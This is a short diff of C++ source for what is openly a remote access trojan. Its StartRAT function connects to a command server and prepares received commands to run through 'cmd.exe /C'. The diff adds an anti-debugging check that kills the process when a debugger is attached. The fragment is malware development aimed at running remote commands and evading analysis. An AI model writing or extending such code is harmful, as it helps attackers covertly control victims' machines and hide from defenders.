@@ -1,19 +1,21 @@
 #include <iostream>
 #include <string>
-#include <ctime>
-#include <cstdlib>
 #include "TCPClient.h"
 #include "utils.h"
 
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
-	
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
+	
 
 	while (true)
 	{
+		if (isDebuggerAttached())
+		{
+			ExitProcess(0);
+		}
 
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
